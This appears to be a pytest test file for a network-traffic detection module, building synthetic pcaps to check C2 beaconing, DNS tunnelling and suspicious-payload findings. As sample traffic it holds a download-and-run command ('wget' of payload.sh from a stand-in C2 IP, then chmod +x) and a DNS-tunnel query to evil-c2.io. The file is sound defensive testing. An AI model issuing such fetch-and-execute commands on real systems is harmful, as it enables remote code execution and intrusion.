"""Unit tests for modules/dynamic/network_monitor.py.

Exercises each of the four detection features (destination reputation,
payload content inspection, DNS anomaly detection, beacon timing) plus
the pre-processing edge cases (empty capture, malformed file). All test
pcaps are built in-memory with scapy and written to pytest's `tmp_path`
fixture -- no external capture files are required for these tests to
pass (see `tmp/build_test_pcap.py` for a larger, human-inspectable
synthetic capture pair used for manual/CLI validation instead).

Inputs:
    None directly (pytest's `tmp_path` fixture provides a fresh
    directory per test; packets are constructed with scapy and written
    to small temporary pcap files).

Outputs:
    None (test assertions; pytest reports pass/fail).
"""

import logging
from pathlib import Path
from typing import List, Optional

import pytest
from scapy.all import DNS, DNSQR, IP, TCP, UDP, Raw, wrpcap

from core import AnalysisError
from modules.dynamic import network_monitor

_LOCAL_IP = "192.168.1.50"
_C2_IP = "185.220.101.7"
_PUBLIC_IP = "93.184.216.34"
_DNS_SERVER_IP = "8.8.8.8"


def _build_isolated_high_entropy_blob() -> bytes:
    """Build a 256-byte blob with every byte value exactly once, base64-run-safe.

    Shannon entropy depends only on byte-value frequency, not order, so
    any permutation of `bytes(range(256))` has the same deterministic
    peak entropy of 8.0 (see `_MAX_ENTROPY_BLOB` in
    tests/test_firmware_pipeline.py for the same technique). This
    specific permutation additionally interleaves base64-charset byte
    values (A-Z, a-z, 0-9, +, /) among non-charset bytes so no run of 20+
    consecutive bytes accidentally matches this module's own
    `base64_blob` suspicious-string pattern -- letting tests control
    exactly which suspicious-string categories fire.

    Returns:
        256 bytes, each value 0-255 exactly once, entropy exactly 8.0.

    Raises:
        None.
    """
    base64_charset = set(range(65, 91)) | set(range(97, 123)) | set(range(48, 58)) | {43, 47}
    charset_bytes = [v for v in range(256) if v in base64_charset]
    other_bytes = [v for v in range(256) if v not in base64_charset]

    blob = bytearray()
    other_index = 0
    for value in charset_bytes:
        for _ in range(3):
            if other_index < len(other_bytes):
                blob.append(other_bytes[other_index])
                other_index += 1
        blob.append(value)
    blob.extend(other_bytes[other_index:])
    return bytes(blob)


# Verified via modules.entropy.shannon_entropy: entropy exactly 8.0,
# contains no base64-pattern-matching run.
_ISOLATED_HIGH_ENTROPY_BLOB = _build_isolated_high_entropy_blob()

# 48 hex characters -- verified via modules.entropy.shannon_entropy to
# clear both config.NETWORK_MONITOR_DNS_ENTROPY_THRESHOLD (3.8) and the
# hardcoded 40-char subdomain-length check. Deterministic (not
# os.urandom-derived) for reproducible tests, same rationale as the
# entropy blob above.
_DNS_TUNNEL_SUBDOMAIN = "208c69789b22a83beff760d69172c3769c22e5eabf910d4b"


def _tcp_packet(
    dst: str, dport: int, payload: bytes, sport: int = 51000, timestamp: Optional[float] = None
):
    """Build one TCP/IP packet from `_LOCAL_IP` carrying a Raw payload.

    Args:
        dst: Destination IP address.
        dport: Destination port.
        payload: Raw payload bytes.
        sport: Source port.
        timestamp: If given, explicitly sets the packet's capture
            timestamp (needed for deterministic beacon-interval tests).

    Returns:
        A scapy Packet (IP/TCP/Raw).

    Raises:
        None.
    """
    pkt = IP(src=_LOCAL_IP, dst=dst) / TCP(sport=sport, dport=dport) / Raw(load=payload)
    if timestamp is not None:
        pkt.time = timestamp
    return pkt


def _write_pcap(tmp_path: Path, packets: List, name: str = "capture.pcap") -> str:
    """Write a list of scapy packets to a small temporary pcap file.

    Args:
        tmp_path: Pytest-provided temporary directory.
        packets: Packets to write (may be empty).
        name: Filename within `tmp_path`.

    Returns:
        String path to the written pcap file.

    Raises:
        None.
    """
    pcap_path = tmp_path / name
    wrpcap(str(pcap_path), packets)
    return str(pcap_path)


def test_clean_pcap_local_and_benign_port_traffic_produces_zero_findings(tmp_path: Path) -> None:
    """Local destinations and public-but-benign-port traffic produce no findings.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If any finding is produced.
    """
    packets = [
        _tcp_packet("10.0.0.1", dport=22, payload=b"local ssh traffic", sport=40000),
        _tcp_packet(_PUBLIC_IP, dport=80, payload=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"),
    ]
    pcap_path = _write_pcap(tmp_path, packets)

    findings = network_monitor.analyze(pcap_path)

    assert findings == []


def test_public_nonbenign_port_with_suspicious_string_and_high_entropy_payload_is_high(
    tmp_path: Path,
) -> None:
    """A non-benign-port connection with one suspicious string plus high entropy scores HIGH.

    Score: +30 (public IP, non-benign port) +25 (one suspicious string
    match) +20 (payload entropy above threshold) = 75, landing in the
    60-79 HIGH band.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If severity isn't "high" or the suspicious
            string isn't recorded in the raw dict.
    """
    payload = b"wget " + _ISOLATED_HIGH_ENTROPY_BLOB
    pkt = _tcp_packet(_C2_IP, dport=9001, payload=payload)
    pcap_path = _write_pcap(tmp_path, [pkt])

    findings = network_monitor.analyze(pcap_path)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.severity == "high"
    assert "shell_command:wget" in finding.raw["suspicious_strings_found"]


def test_plaintext_on_port_443_without_tls_handshake_is_still_flagged(tmp_path: Path) -> None:
    """Plaintext traffic on port 443 (no real TLS handshake) is inspected, not waved through.

    Port 443 is deliberately absent from `config.NETWORK_MONITOR_BENIGN_PORTS`
    -- plaintext-on-443 is a real evasion technique.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If the connection isn't flagged, or is
            incorrectly marked as TLS-encrypted.
    """
    payload = b"wget http://185.220.101.7/payload.sh; chmod +x payload.sh"
    pkt = _tcp_packet(_PUBLIC_IP, dport=443, payload=payload, sport=51999)
    pcap_path = _write_pcap(tmp_path, [pkt])

    findings = network_monitor.analyze(pcap_path)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.raw["destination_port"] == 443
    assert finding.raw["is_tls_encrypted"] is False


def test_repeated_regular_beacon_is_critical_with_interval_populated(tmp_path: Path) -> None:
    """Four connections at a regular ~1s interval are flagged CRITICAL with the interval recorded.

    Score: +30 (public IP, non-benign port) +20 (4 repeats >= threshold)
    +30 (regular timing) = 80, landing in the 80+ CRITICAL band.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If severity isn't "critical", `is_regular_beacon`
            isn't True, or the interval isn't ~1.0 seconds.
    """
    base_time = 1_700_000_000.0
    packets = [
        _tcp_packet(_C2_IP, dport=4444, payload=b"beacon", timestamp=base_time + i * 1.0)
        for i in range(4)
    ]
    pcap_path = _write_pcap(tmp_path, packets)

    findings = network_monitor.analyze(pcap_path)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.severity == "critical"
    assert finding.raw["is_repeated"] is True
    assert finding.raw["is_regular_beacon"] is True
    assert finding.raw["beacon_interval_seconds"] == pytest.approx(1.0)


def test_tls_encrypted_connection_skips_payload_inspection(tmp_path: Path) -> None:
    """A genuinely TLS-encrypted connection skips string/entropy inspection of its payload.

    Detected via the TLS handshake ContentType byte (0x16) at the start
    of the raw payload -- the same heuristic `_is_tls_encrypted()` uses
    when scapy's TLS layer doesn't fully dissect a hand-built packet.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If the connection isn't marked TLS-encrypted, or
            payload_sample/payload_entropy aren't None.
    """
    tls_payload = bytes([0x16, 0x03, 0x01]) + b"\x00" * 40
    pkt = _tcp_packet(_C2_IP, dport=8443, payload=tls_payload, sport=52000)
    pcap_path = _write_pcap(tmp_path, [pkt])

    findings = network_monitor.analyze(pcap_path)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.raw["is_tls_encrypted"] is True
    assert finding.raw["payload_sample"] is None
    assert finding.raw["payload_entropy"] is None


def test_dns_query_with_long_high_entropy_subdomain_produces_anomaly_finding(
    tmp_path: Path,
) -> None:
    """A DNS query with a long, high-entropy subdomain produces a DNS anomaly Finding.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If no DNS anomaly Finding is produced, or its
            raw fields don't match the queried domain.
    """
    domain = f"{_DNS_TUNNEL_SUBDOMAIN}.evil-c2.io."
    pkt = IP(src=_LOCAL_IP, dst=_DNS_SERVER_IP) / UDP(sport=53000, dport=53) / DNS(
        rd=1, qd=DNSQR(qname=domain)
    )
    pcap_path = _write_pcap(tmp_path, [pkt])

    findings = network_monitor.analyze(pcap_path)

    dns_findings = [f for f in findings if "query_domain" in f.raw]
    assert len(dns_findings) == 1
    assert dns_findings[0].raw["query_domain"] == domain.rstrip(".")
    assert dns_findings[0].raw["subdomain_length"] == len(_DNS_TUNNEL_SUBDOMAIN)


def test_empty_pcap_produces_zero_findings_and_logs_info(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """An empty capture produces zero findings, doesn't crash, and logs an INFO message.

    Args:
        tmp_path: Pytest-provided temporary directory.
        caplog: Pytest's log capture fixture.

    Returns:
        None.

    Raises:
        AssertionError: If findings is non-empty or no matching INFO log
            record is emitted.
    """
    pcap_path = _write_pcap(tmp_path, [])

    with caplog.at_level(logging.INFO, logger=network_monitor.__name__):
        findings = network_monitor.analyze(pcap_path)

    assert findings == []
    assert any(
        "no packets" in record.message and record.levelno == logging.INFO
        for record in caplog.records
    )


def test_malformed_non_pcap_file_raises_analysis_error(tmp_path: Path) -> None:
    """A file that isn't a valid pcap raises AnalysisError cleanly.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If AnalysisError isn't raised.
    """
    bad_path = tmp_path / "not_a_pcap.bin"
    bad_path.write_bytes(b"this is not a valid pcap file at all, just plain bytes")

    with pytest.raises(AnalysisError):
        network_monitor.analyze(str(bad_path))


def test_missing_capture_file_raises_file_not_found_error(tmp_path: Path) -> None:
    """A nonexistent capture path raises FileNotFoundError, matching every other module's contract.

    Args:
        tmp_path: Pytest-provided temporary directory.

    Returns:
        None.

    Raises:
        AssertionError: If FileNotFoundError isn't raised.
    """
    missing_path = tmp_path / "does_not_exist.pcap"

    with pytest.raises(FileNotFoundError):
        network_monitor.analyze(str(missing_path))
